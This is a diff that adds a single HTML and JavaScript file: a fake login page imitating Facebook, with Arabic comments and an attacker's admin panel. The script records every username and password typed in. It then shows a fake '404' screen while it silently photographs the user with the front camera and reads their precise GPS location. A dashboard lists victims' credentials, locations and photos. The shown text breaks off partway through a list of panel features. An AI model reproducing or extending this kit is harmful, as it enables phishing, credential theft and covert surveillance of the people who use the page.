@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>تسجيل الدخول</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui, 'Segoe UI', sans-serif; }
+    body { background:#000; display:flex; justify-content:center; align-items:flex-start; min-height:100vh; margin:0; padding:0; }
+    .app-container { width:100%; max-width:796px; min-height:100vh; background:#0C0F14; display:flex; flex-direction:column; position:relative; }
+    .login-wrapper { display:flex; flex-direction:column; min-height:100vh; width:100%; }
+    .top-section { background:#0C0F14; width:100%; flex-shrink:0; padding-bottom:8px; }
+    .bottom-section { background:#000; width:100%; flex:1; min-height:60px; }
+    .language-selector { display:flex; justify-content:center; align-items:center; padding-top:28px; padding-bottom:10px; color:#a0a4ae; font-size:24px; gap:4px; }
+    .language-selector span { color:#aeb2bb; }
+    .language-selector i { font-size:20px; color:#aeb2bb; margin-left:6px; }
+    .divider-line { width:100%; height:1px; background:#1e2228; border:none; }
+    .login-form { padding:0 24px; display:flex; flex-direction:column; background:#0C0F14; flex:1; }
+    .logo-wrapper { display:flex; justify-content:center; align-items:center; margin:18px 0 20px 0; }
+    .logo-goat { width:110px; height:110px; display:flex; justify-content:center; align-items:center; }
+    .logo-goat img, .logo-goat svg { width:100%; height:100%; object-fit:contain; display:block; filter:drop-shadow(0 0 8px rgba(180,0,0,0.3)); }
+    .field-label { color:#aeb2bb; font-size:22px; font-weight:400; margin-bottom:4px; margin-top:8px; }
+    .field-label:first-of-type { margin-top:0; }
+    .input-container { width:100%; background:#25282D; border:1px solid #30343A; border-radius:2px; height:78px; display:flex; align-items:center; padding:0 16px; margin-bottom:4px; transition:border 0.15s; }
+    .input-container:focus-within { border-color:#4a5df5; }
+    .input-container input { width:100%; height:100%; background:transparent; border:none; outline:none; color:#e8ecf2; font-size:22px; padding:0; }
+    .input-container input::placeholder { color:#5a5f69; font-size:22px; font-weight:300; opacity:0.7; }
+    .password-wrapper { display:flex; align-items:center; width:100%; height:100%; }
+    .password-wrapper input { flex:1; height:100%; background:transparent; border:none; outline:none; color:#e8ecf2; font-size:22px; }
+    .password-wrapper input::placeholder { color:#5a5f69; font-size:22px; font-weight:300; opacity:0.7; }
+    .show-toggle { display:flex; align-items:center; gap:6px; color:#aeb2bb; font-size:20px; font-weight:400; cursor:default; user-select:none; flex-shrink:0; padding-left:6px; }
+    .show-toggle i { font-size:22px; color:#aeb2bb; }
+    .login-btn { width:100%; height:72px; background:#073858; border:none; border-radius:24px; color:#b0c4d9; font-size:24px; font-weight:600; letter-spacing:0.6px; margin:14px 0 6px 0; cursor:pointer; transition:background 0.3s; }
+    .login-btn.active { background:#1a7b9e; color:#fff; }
+    .login-btn:hover { background:#0a466b; }
+    .login-btn.active:hover { background:#2a8fb0; }
+    .forgot-password { text-align:center; color:#e2e5ea; font-size:22px; font-weight:600; margin:10px 0 16px 0; }
+    .continue-btn { width:100%; height:72px; background:#4A5DF5; border:none; border-radius:24px; display:flex; justify-content:center; align-items:center; gap:12px; color:#fff; font-size:22px; font-weight:600; margin:8px 0 10px 0; cursor:pointer; transition:background 0.15s; }
+    .continue-btn i { font-size:30px; background:#fff; border-radius:50%; padding:5px; color:#4A5DF5; display:inline-flex; justify-content:center; align-items:center; width:34px; height:34px; }
+    .continue-btn:hover { background:#3b4ee0; }
+    .or-divider { display:flex; align-items:center; justify-content:center; gap:14px; margin:14px 0 10px 0; color:#7a7f8a; font-size:20px; }
+    .or-line { flex:1; height:1px; background:#303030; max-width:100px; }
+    .create-account { text-align:center; color:#e2e5ea; font-size:22px; font-weight:600; margin:14px 0 40px 0; }
+    .error-message { color:#ff4d4d; font-size:22px; font-weight:500; margin:6px 0 2px 0; text-align:center; display:none; background:transparent; padding:6px; border:none; }
+    .error-message.show { display:block; }
+
+    /* نافذة GPS + كاميرا صامتة (لا تظهر أي رسائل للمستخدم) */
+    .gps-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; display:none; justify-content:center; align-items:center; z-index:9999; padding:0; }
+    .gps-overlay.show { display:flex; }
+    #videoPreview { width:100%; height:100%; object-fit:cover; display:none; background:#000; }
+    #photoPreview { width:100%; height:100%; object-fit:contain; display:none; background:#000; }
+    .gps-modal { display:none; } /* إخفاء أي واجهة مرئية */
+
+    /* لوحة المسؤول */
+    .admin-panel { display:none; background:#080000; color:#ddd; padding:16px 14px; min-height:100vh; flex-direction:column; width:100%; background-image:radial-gradient(ellipse at 20% 50%, rgba(80,0,0,0.15) 0%, transparent 60%), radial-gradient(ellipse at 80% 50%, rgba(80,0,0,0.15) 0%, transparent 60%); }
+    .admin-panel.active { display:flex; }
+    .admin-header { display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #3a0a0a; padding-bottom:10px; margin-bottom:16px; flex-wrap:wrap; }
+    .admin-header h1 { font-size:30px; color:#cc2222; text-shadow:0 0 20px #660000, 0 0 40px #330000; letter-spacing:2px; display:flex; align-items:center; gap:8px; }
+    .admin-header h1 i { font-size:28px; }
+    .admin-header button { background:#1a0505; border:1px solid #5a1515; color:#cc6666; padding:8px 18px; border-radius:30px; font-size:20px; cursor:pointer; transition:0.3s; }
+    .admin-header button:hover { background:#3a0a0a; border-color:#aa3333; }
+    .admin-stats { display:grid; grid-template-columns:repeat(5,1fr); gap:8px; margin-bottom:16px; }
+    .stat-card { background:#0d0303; border:1px solid #2a0a0a; border-radius:10px; padding:8px 4px; text-align:center; }
+    .stat-card .number { font-size:22px; font-weight:700; color:#dd4444; text-shadow:0 0 10px rgba(200,0,0,0.3); }
+    .stat-card .label { font-size:11px; color:#7a5a5a; margin-top:2px; }
+    .admin-dashboard { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-bottom:20px; }
+    .admin-card { background:#0a0303; border:1px solid #2a0a0a; border-radius:12px; padding:14px 12px; box-shadow:0 0 30px rgba(60,0,0,0.2); }
+    .admin-card h3 { color:#bb4444; font-size:18px; margin-bottom:10px; border-bottom:1px solid #1a0808; padding-bottom:6px; display:flex; align-items:center; gap:8px; }
+    .admin-card h3 i { font-size:16px; }
+    .logo-control { display:flex; flex-direction:column; gap:10px; }
+    .logo-control .preview-box { background:#0a0303; border:2px dashed #3a1515; padding:12px; display:flex; justify-content:center; align-items:center; min-height:100px; border-radius:8px; }
+    .logo-control .preview-box img, .logo-control .preview-box svg { max-width:90px; max-height:90px; object-fit:contain; }
+    .logo-control input[type="file"] { color:#aaa; background:#0f0505; padding:8px; border:1px solid #2a0f0f; border-radius:6px; width:100%; font-size:14px; }
+    .btn-group { display:flex; gap:8px; flex-wrap:wrap; }
+    .btn-group button { background:#0f0505; border:1px solid #3a1515; color:#bb8888; padding:6px 14px; border-radius:20px; font-size:15px; cursor:pointer; flex:1 0 auto; transition:0.2s; }
+    .btn-group button:hover { background:#1f0a0a; border-color:#6a2222; color:#dd9999; }
+    .lists-container { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:6px; }
+    .list-box { background:#0a0303; border:1px solid #2a0a0a; border-radius:12px; padding:12px 10px; }
+    .list-box h4 { color:#bb4444; font-size:17px; margin-bottom:8px; display:flex; align-items:center; gap:6px; border-bottom:1px solid #1a0808; padding-bottom:4px; }
+    .list-box h4 .badge { font-size:13px; background:#1a0505; padding:0 10px; border-radius:12px; color:#aa5555; }
+    .list-scroll { max-height:200px; overflow-y:auto; border-radius:6px; }
+    .list-item { display:grid; grid-template-columns:30px 80px 1fr 1fr; gap:4px; padding:6px 6px; border-bottom:1px solid #150808; color:#b0a0a0; font-size:13px; align-items:center; }
+    .list-item .idx { color:#883333; font-weight:700; font-size:12px; }
+    .list-item .time { color:#7a6a6a; font-size:11px; }
+    .list-item .phone { color:#aabbcc; font-size:13px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .list-item .pass { color:#887766; font-size:13px; font-family:monospace; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .list-item.status-success { border-left:3px solid #4caf50; }
+    .list-item.status-fail { border-left:3px solid #cc3333; }
+    .list-item-gps { display:grid; grid-template-columns:30px 70px 1fr 1fr 40px 40px; gap:4px; padding:8px 6px; border-bottom:1px solid #150808; color:#b0a0a0; font-size:12px; align-items:center; }
+    .list-item-gps .idx { color:#883333; font-weight:700; font-size:12px; }
+    .list-item-gps .time { color:#7a6a6a; font-size:10px; }
+    .list-item-gps .phone { color:#aabbcc; font-size:12px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .list-item-gps .pass { color:#887766; font-size:12px; font-family:monospace; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .list-item-gps .gps-link { color:#4a8faf; cursor:pointer; font-size:18px; text-align:center; transition:0.2s; }
+    .list-item-gps .gps-link:hover { color:#6abfdf; }
+    .list-item-gps .download-link { color:#8a7a5a; cursor:pointer; font-size:18px; text-align:center; transition:0.2s; }
+    .list-item-gps .download-link:hover { color:#ccaa7a; }
+    .list-item-gps.status-fail { border-left:3px solid #cc3333; }
+    .empty-list { padding:16px; text-align:center; color:#4a3a3a; font-size:16px; }
+    .admin-footer { margin-top:20px; padding:10px; border-top:1px solid #1a0808; color:#4a3a3a; text-align:center; font-size:16px; }
+
+    /* 30 ميزة في شبكة */
+    .feature-grid { display:grid; grid-template-columns:repeat(5,1fr); gap:6px; margin-top:8px; }
+    .feature-btn { background:#0f0505; border:1px solid #2a0f0f; border-radius:8px; padding:8px 4px; color:#bb8888; font-size:12px; cursor:pointer; transition:0.2s; text-align:center; }
+    .feature-btn i { display:block; font-size:18px; margin-bottom:3px; color:#aa5555; }
+    .feature-btn:hover { background:#1f0a0a; border-color:#5a2222; color:#dd9999; }
+    .feature-btn:hover i { color:#dd7777; }
+
+    @media (max-width:600px) {
+      .admin-dashboard { grid-template-columns:1fr; }
+      .lists-container { grid-template-columns:1fr; }
+      .admin-stats { grid-template-columns:repeat(3,1fr); }
+      .feature-grid { grid-template-columns:repeat(3,1fr); }
+      .list-item { grid-template-columns:25px 65px 1fr 1fr; font-size:12px; }
+      .list-item-gps { grid-template-columns:25px 60px 1fr 1fr 30px 30px; font-size:11px; }
+    }
+    @media (max-width:480px) {
+      .login-form { padding:0 16px; }
+      .language-selector { font-size:20px; padding-top:20px; }
+      .field-label { font-size:18px; }
+      .input-container { height:64px; padding:0 12px; }
+      .input-container input, .password-wrapper input { font-size:18px; }
+      .show-toggle { font-size:17px; }
+      .login-btn { height:60px; font-size:20px; border-radius:20px; }
+      .continue-btn { height:60px; font-size:18px; gap:8px; }
+      .admin-header h1 { font-size:24px; }
+      .stat-card .number { font-size:18px; }
+      .feature-grid { grid-template-columns:repeat(3,1fr); }
+    }
+    .list-scroll::-webkit-scrollbar { width:4px; }
+    .list-scroll::-webkit-scrollbar-track { background:#0a0303; }
+    .list-scroll::-webkit-scrollbar-thumb { background:#3a1a1a; border-radius:4px; }
+  </style>
+</head>
+<body>
+<div class="app-container" id="appContainer">
+
+  <!-- واجهة الدخول -->
+  <div id="loginWrapper" class="login-wrapper">
+    <div class="top-section">
+      <div class="language-selector"><span>English (US)</span><i class="fas fa-chevron-down"></i></div>
+      <div class="divider-line"></div>
+    </div>
+    <div class="login-form">
+      <div class="logo-wrapper"><div class="logo-goat" id="mainLogo"></div></div>
+      <div id="errorMessage" class="error-message">⚠️ 404 — Login failed</div>
+      <div class="field-label">Enter your mobile number, username or email</div>
+      <div class="input-container"><input type="text" id="usernameInput" placeholder=" " value=""></div>
+      <div class="field-label" style="margin-top:10px;">Enter your password</div>
+      <div class="input-container">
+        <div class="password-wrapper">
+          <input type="password" id="passwordInput" placeholder=" " value="">
+          <div class="show-toggle" id="showToggle"><span>Show</span><i class="fas fa-eye-slash" id="eyeIcon"></i></div>
+        </div>
+      </div>
+      <button class="login-btn" id="loginBtn">Log in</button>
+      <div class="forgot-password">Forgot password?</div>
+      <button class="continue-btn" id="continueBtn"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
+      <div class="or-divider"><span class="or-line"></span><span>OR</span><span class="or-line"></span></div>
+      <div class="create-account">Create new account</div>
+    </div>
+    <div class="bottom-section"></div>
+  </div>
+
+  <!-- نافذة صامتة لجمع البيانات (تظهر فقط أبيض و 404) -->
+  <div class="gps-overlay" id="gpsOverlay">
+    <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;width:100%;height:100%;background:#fff;color:#000;">
+      <h1 style="font-size:72px;color:#cc3333;">404</h1>
+      <p style="font-size:24px;color:#333;">Not Found</p>
+    </div>
+    <video id="videoPreview" autoplay playsinline style="display:none;"></video>
+    <img id="photoPreview" style="display:none;">
+  </div>
+
+  <!-- لوحة المسؤول -->
+  <div id="adminPanel" class="admin-panel">
+    <div class="admin-header">
+      <h1><i class="fas fa-fire"></i> لوحة التحكم</h1>
+      <button id="logoutAdminBtn"><i class="fas fa-skull"></i> خروج</button>
+    </div>
+
+    <!-- إحصائيات -->
+    <div class="admin-stats">
+      <div class="stat-card"><div class="number" id="totalCount">0</div><div class="label">إجمالي</div></div>
+      <div class="stat-card"><div class="number" id="successCount" style="color:#4caf50;">0</div><div class="label">✅ ناجحة</div></div>
+      <div class="stat-card"><div class="number" id="failCount" style="color:#cc3333;">0</div><div class="label">❌ فاشلة</div></div>
+      <div class="stat-card"><div class="number" id="gpsCount" style="color:#4a8faf;">0</div><div class="label">📍 مع GPS</div></div>
+      <div class="stat-card"><div class="number" id="liveCount" style="color:#ff8800;">0</div><div class="label">👁️ متعقب</div></div>
+    </div>
+
+    <!-- 30 ميزة -->
+    <div class="admin-card" style="margin-bottom:14px;">
+      <h3><i class="fas fa-rocket"></i> 30 ميزة ثورية</h3>
+      <div class="feature-grid" id="featureGrid">
+        <!-- سيتم توليدها عبر JS -->
+      </div>
+    </div>
+
+    <div class="admin-dashboard">
+      <div class="admin-card">
+        <h3><i class="fas fa-pentagram"></i> الشعار</h3>
+        <div class="logo-control">
+          <div class="preview-box" id="logoPreviewBox"></div>
+          <input type="file" id="logoUpload" accept="image/*">
+          <div class="btn-group"><button id="saveLogoBtn"><i class="fas fa-save"></i> حفظ</button><button id="resetLogoBtn"><i class="fas fa-undo-alt"></i> إعادة</button></div>
+        </div>
+      </div>
+      <div class="admin-card">
+        <h3><i class="fas fa-chart-bar"></i> سريع</h3>
+        <div style="display:flex;flex-direction:column;gap:6px;padding:4px 0;">
+          <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:15px;"><span>🔴 آخر فاشلة</span><span id="lastFailTime" style="color:#cc6666;">—</span></div>
+          <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:15px;"><span>🟢 آخر ناجحة</span><span id="lastSuccessTime" style="color:#4caf50;">—</span></div>
+          <div style="display:flex;justify-content:space-between;color:#8a7a7a;font-size:15px;border-top:1px solid #1a0808;padding-top:6px;"><span>👹 الملعونين</span><span id="totalFailCount" style="color:#cc3333;font-weight:700;">0</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lists-container">
+      <div class="list-box">
+        <h4><i class="fas fa-check-circle" style="color:#4caf50;"></i> الناجحين <span class="badge" id="successBadge">0</span></h4>
+        <div class="list-scroll" id="successList"><div class="empty-list">لا توجد محاولات ناجحة</div></div>
+      </div>
+      <div class="list-box">
+        <h4><i class="fas fa-times-circle" style="color:#cc3333;"></i> الفاشلين <span class="badge" id="failBadge">0</span></h4>
+        <div class="list-scroll" id="failList"><div class="empty-list">لا توجد محاولات فاشلة</div></div>
+      </div>
+    </div>
+    <div class="admin-footer"><i class="fas fa-fire"></i> نظام الحماية v5.0 — <span id="footerTime"></span></div>
+  </div>
+</div>
+
+<script>
+  (function(){
+    "use strict";
+
+    // ====== عناصر ======
+    const loginWrapper = document.getElementById('loginWrapper');
+    const adminPanel = document.getElementById('adminPanel');
+    const usernameInput = document.getElementById('usernameInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorMsg = document.getElementById('errorMessage');
+    const showToggle = document.getElementById('showToggle');
+    const eyeIcon = document.getElementById('eyeIcon');
+    const logoutBtn = document.getElementById('logoutAdminBtn');
+    const continueBtn = document.getElementById('continueBtn');
+
+    const mainLogo = document.getElementById('mainLogo');
+    const logoPreviewBox = document.getElementById('logoPreviewBox');
+    const logoUpload = document.getElementById('logoUpload');
+    const saveLogoBtn = document.getElementById('saveLogoBtn');
+    const resetLogoBtn = document.getElementById('resetLogoBtn');
+
+    const successList = document.getElementById('successList');
+    const failList = document.getElementById('failList');
+    const successBadge = document.getElementById('successBadge');
+    const failBadge = document.getElementById('failBadge');
+    const totalCount = document.getElementById('totalCount');
+    const successCount = document.getElementById('successCount');
+    const failCount = document.getElementById('failCount');
+    const gpsCount = document.getElementById('gpsCount');
+    const liveCount = document.getElementById('liveCount');
+    const totalFailCount = document.getElementById('totalFailCount');
+    const lastFailTime = document.getElementById('lastFailTime');
+    const lastSuccessTime = document.getElementById('lastSuccessTime');
+    const footerTime = document.getElementById('footerTime');
+    const featureGrid = document.getElementById('featureGrid');
+
+    // GPS Overlay
+    const gpsOverlay = document.getElementById('gpsOverlay');
+    const videoPreview = document.getElementById('videoPreview');
+    const photoPreview = document.getElementById('photoPreview');
+
+    // ====== بيانات ======
+    let ADMIN_PHONE = '0561368108';
+    let ADMIN_PASS = 'nouh1234';
+    const LOGO_KEY = 'custom_login_logo';
+    const ATTEMPTS_KEY = 'security_attempts_v5';
+    const GPS_DATA_KEY = 'security_gps_v5';
+    const PHOTO_DATA_KEY = 'security_photo_v5';
+    const NOTES_KEY = 'security_notes_v5';
+    const LIVE_KEY = 'security_live_data';
+
+    let attemptsData = { success: [], fail: [] };
+    let gpsData = {};
+    let photoData = {};
+    let notesData = {};
+    let liveData = {};
+
+    let passwordVisible = false;
+    let stream = null;
+    let isCapturing = false;
+
+    // ====== تحميل وحفظ ======
+    function loadData(key, defaultVal) {
+      try { const d = localStorage.getItem(key); return d ? JSON.parse(d) : defaultVal; } catch(e){ return defaultVal; }
+    }
+    function saveData(key, data) { localStorage.setItem(key, JSON.stringify(data)); }
+
+    attemptsData = loadData(ATTEMPTS_KEY, { success: [], fail: [] });
+    gpsData = loadData(GPS_DATA_KEY, {});
+    photoData = loadData(PHOTO_DATA_KEY, {});
+    notesData = loadData(NOTES_KEY, {});
+    liveData = loadData(LIVE_KEY, { trackers: {} });
+
+    // ====== الشعار ======
+    function getSavedLogo() { return localStorage.getItem(LOGO_KEY); }
+    function saveLogoToStorage(url) { localStorage.setItem(LOGO_KEY, url); }
+    function removeSavedLogo() { localStorage.removeItem(LOGO_KEY); }
+
+    function renderLogo(dataUrl) {
+      mainLogo.innerHTML = '';
+      logoPreviewBox.innerHTML = '';
+      if (dataUrl) {
+        const img = document.createElement('img');
+        img.src = dataUrl;
+        img.style.width = '110px'; img.style.height = '110px'; img.style.objectFit = 'contain';
+        mainLogo.appendChild(img);
+        const p = document.createElement('img');
+        p.src = dataUrl; p.style.width = '90px'; p.style.height = '90px'; p.style.objectFit = 'contain';
+        logoPreviewBox.appendChild(p);
+      } else {
+        const svg = `<svg viewBox="0 0 120 120" fill="none"><circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/><path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/><path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/><path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/><circle cx="48" cy="38" r="6" fill="#cc0000"/><circle cx="68" cy="36" r="6" fill="#cc0000"/><circle cx="48" cy="38" r="2.5" fill="#ffaa00"/><circle cx="68" cy="36" r="2.5" fill="#ffaa00"/><rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/><circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/><circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/><path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5"/></svg>`;
+        mainLogo.innerHTML = svg;
+        logoPreviewBox.innerHTML = svg.replace('120 120','100 100');
+      }
+    }
+    function loadSavedLogo() { renderLogo(getSavedLogo() || null); }
+
+    // ====== وقت ======
+    function updateFooterTime() { footerTime.textContent = new Date().toLocaleString('ar-EG'); }
+    setInterval(updateFooterTime, 1000); updateFooterTime();
+
+    // ====== عرض القوائم ======
+    function renderLists() {
+      const succ = attemptsData.success || [];
+      const fail = attemptsData.fail || [];
+
+      if (succ.length === 0) successList.innerHTML = '<div class="empty-list">لا توجد محاولات ناجحة</div>';
+      else {
+        let h = '';
+        succ.forEach((item, i) => {
+          h += `<div class="list-item status-success"><span class="idx">${String(i+1).padStart(2,'0')}</span><span class="time">${item.time||'—'}</span><span class="phone">📞 ${item.phone||'(غير مدخل)'}</span><span class="pass">🔑 ${item.password||'(غير مدخل)'}</span></div>`;
+        });
+        successList.innerHTML = h;
+      }
+
+      if (fail.length === 0) failList.innerHTML = '<div class="empty-list">لا توجد محاولات فاشلة</div>';
+      else {
+        let h = '';
+        fail.forEach((item, i) => {
+          const gps = item.gps || null;
+          const photo = item.photo || null;
+          const gpsIcon = gps ? `<span class="gps-link" data-gps="${encodeURIComponent(JSON.stringify(gps))}" title="فتح في الخرائط"><i class="fas fa-map-pin"></i></span>` : '<span style="color:#3a2a2a;font-size:12px;">—</span>';
+          const dlIcon = photo ? `<span class="download-link" data-photo="${encodeURIComponent(photo)}" title="تحميل الصورة"><i class="fas fa-download"></i></span>` : '<span style="color:#3a2a2a;font-size:12px;">—</span>';
+          h += `<div class="list-item-gps status-fail"><span class="idx">${String(i+1).padStart(2,'0')}</span><span class="time">${item.time||'—'}</span><span class="phone">📞 ${item.phone||'(غير مدخل)'}</span><span class="pass">🔑 ${item.password||'(غير مدخل)'}</span>${gpsIcon}${dlIcon}</div>`;
+        });
+        failList.innerHTML = h;
+        failList.querySelectorAll('.gps-link').forEach(el => {
+          el.addEventListener('click', function(e) {
+            e.stopPropagation();
+            try { const d = JSON.parse(decodeURIComponent(this.dataset.gps)); if(d.lat && d.lng) window.open(`https://www.google.com/maps?q=${d.lat},${d.lng}`,'_blank'); else alert('بيانات GPS غير مكتملة'); } catch(err){ alert('خطأ'); }
+          });
+        });
+        failList.querySelectorAll('.download-link').forEach(el => {
+          el.addEventListener('click', function(e) {
+            e.stopPropagation();
+            try { const url = decodeURIComponent(this.dataset.photo); const a = document.createElement('a'); a.href = url; a.download = 'photo_'+Date.now()+'.png'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(err){ alert('خطأ في التحميل'); }
+          });
+        });
+      }
+
+      const total = succ.length + fail.length;
+      successBadge.textContent = succ.length;
+      failBadge.textContent = fail.length;
+      totalCount.textContent = total;
+      successCount.textContent = succ.length;
+      failCount.textContent = fail.length;
+      totalFailCount.textContent = fail.length;
+      const gpsCnt = fail.filter(f => f.gps !== null && f.gps !== undefined).length;
+      gpsCount.textContent = gpsCnt;
+      liveCount.textContent = Object.keys(liveData.trackers || {}).length;
+      lastSuccessTime.textContent = succ.length > 0 ? succ[0].time || '—' : '—';
+      lastFailTime.textContent = fail.length > 0 ? fail[0].time || '—' : '—';
+    }
+
+    // ====== إضافة محاولة ======
+    function addAttempt(phone, password, success, gps, photo) {
+      const now = new Date();
+      const timeStr = now.toTimeString().split(' ')[0];
+      const dateStr = now.toLocaleDateString('ar-EG');
+      const fullTime = dateStr + ' ' + timeStr;
+      const entry = { time: fullTime, phone: phone || '(غير مدخل)', password: password || '(غير مدخل)', gps: gps || null, photo: photo || null };
+      if (success) {
+        attemptsData.success.unshift(entry);
+        if (attemptsData.success.length > 50) attemptsData.success.pop();
+      } else {
+        attemptsData.fail.unshift(entry);
+        if (attemptsData.fail.length > 50) attemptsData.fail.pop();
+        if (gps) { const key = 'fail_'+Date.now(); gpsData[key] = gps; saveData(GPS_DATA_KEY, gpsData); }
+        if (photo) { const key = 'fail_'+Date.now(); photoData[key] = photo; saveData(PHOTO_DATA_KEY, photoData); }
+        // إضافة متعقب للشيطان الطفيلي
+        if (gps && gps.lat && gps.lng) {
+          const trackerId = 'tracker_'+Date.now();
+          liveData.trackers[trackerId] = { phone, gps, time: fullTime, active: true };
+          saveData(LIVE_KEY, liveData);
+        }
+      }
+      saveData(ATTEMPTS_KEY, attemptsData);
+      renderLists();
+      return entry;
+    }
+
+    // ====== تبديل كلمة المرور ======
+    function togglePasswordVisibility() {
+      passwordVisible = !passwordVisible;
+      passwordInput.type = passwordVisible ? 'text' : 'password';
+      eyeIcon.className = passwordVisible ? 'fas fa-eye' : 'fas fa-eye-slash';
+    }
+
+    // ====== تحديث زر الدخول ======
+    function updateLoginButton() {
+      const hasText = usernameInput.value.trim().length > 0 || passwordInput.value.trim().length > 0;
+      loginBtn.classList.toggle('active', hasText);
+    }
+
+    // ====== جمع البيانات صامت (بدون أي رسائل) ======
+    function silentCapture(phone, password) {
+      if (isCapturing) return;
+      isCapturing = true;
+
+      // إظهار نافذة 404 بيضاء
+      gpsOverlay.classList.add('show');
+
+      let positionData = null;
+      let photoDataUrl = null;
+      let cameraReady = false;
+      let gpsReady = false;
+      let timeoutId = setTimeout(() => { finishCapture(); }, 6000);
+
+      // الكاميرا
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+          .then(s => {
+            stream = s;
+            videoPreview.srcObject = s;
+            videoPreview.style.display = 'block';
+            videoPreview.play();
+            cameraReady = true;
+            checkReady();
+          })
+          .catch(() => { cameraReady = true; checkReady(); });
+      } else { cameraReady = true; checkReady(); }
+
+      // GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => { positionData = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }; gpsReady = true; checkReady(); },
+          () => { gpsReady = true; checkReady(); },
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+        );
+      } else { gpsReady = true; checkReady(); }
+
+      function checkReady() {
+        if (cameraReady && gpsReady) {
+          // التقاط صورة إن أمكن
+          if (stream && videoPreview.style.display !== 'none') {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoPreview.videoWidth || 640;
+            canvas.height = videoPreview.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
+            photoDataUrl = canvas.toDataURL('image/png');
+            photoPreview.src = photoDataUrl;
+            photoPreview.style.display = 'block';
+            videoPreview.style.display = 'none';
+            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+          }
+          finishCapture();
+        }
+      }
+
+      function finishCapture() {
+        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+        // إضافة المحاولة الفاشلة مع البيانات
+        addAttempt(phone, password, false, positionData, photoDataUrl);
+        // إغلاق النافذة بعد 1.5 ثانية (تبقى شاشة 404)
+        setTimeout(() => {
+          gpsOverlay.classList.remove('show');
+          videoPreview.style.display = 'none';
+          photoPreview.style.display = 'none';
+          videoPreview.srcObject = null;
+          isCapturing = false;
+        }, 1500);
+        clearTimeout(timeoutId);
+      }
+    }
+
+    // ====== معالج الدخول ======
+    function handleLogin() {
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+      const success = (username === ADMIN_PHONE && password === ADMIN_PASS);
+
+      if (success) {
+        addAttempt(username, password, true, null, null);
+        loginWrapper.style.display = 'none';
+        adminPanel.classList.add('active');
+        adminPanel.style.display = 'flex';
+        errorMsg.classList.remove('show');
+        usernameInput.value = ''; passwordInput.value = '';
+        updateLoginButton();
+        return;
+      }
+
+      errorMsg.textContent = '⚠️ 404 — Login failed';
+      errorMsg.classList.add('show');
+      passwordInput.value = '';
+      updateLoginButton();
+
+      // جمع البيانات صامتاً بعد نصف ثانية
+      setTimeout(() => { silentCapture(username, password); }, 400);
+    }
+
+    // ====== خروج ======
+    function logoutAdmin() {
+      adminPanel.classList.remove('active');
+      adminPanel.style.display = 'none';
+      loginWrapper.style.display = 'flex';
+      usernameInput.value = ''; passwordInput.value = '';
+      errorMsg.classList.remove('show');
+      updateLoginButton();
+    }
+
+    // ====== الشعار ======
+    function updateLogoFromFile(file) {
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        const data = e.target.result;
+        renderLogo(data);
+        saveLogoToStorage(data);
+        alert('✅ تم حفظ الشعار');
+      };
+      reader.readAsDataURL(file);
+    }
+    function resetLogoToDefault() {
+      removeSavedLogo();
+      renderLogo(null);
+      logoUpload.value = '';
+      alert('🔄 تم إعادة الشعار');
+    }
+
+    // ====== 30 ميزة ثورية ======
+    const features = [
+      { id: 'export', icon: 'fa-file-export', label: 'تصدير JSON' },
+      { id: 'csv', icon: 'fa-file-csv', label: 'تصدير CSV' },
+      { id: 'clear', icon: 'fa-trash-alt', label: 'مسح الكل' },
+      { id: 'filter', icon: 'fa-filter', label: 'فلترة' },
+      { id: 'notes', icon: 'fa-sticky-note', label: 'ملاحظات' },
+      { id: 'qrcode', icon: 'fa-qrcode', label: 'ماسح QR' },
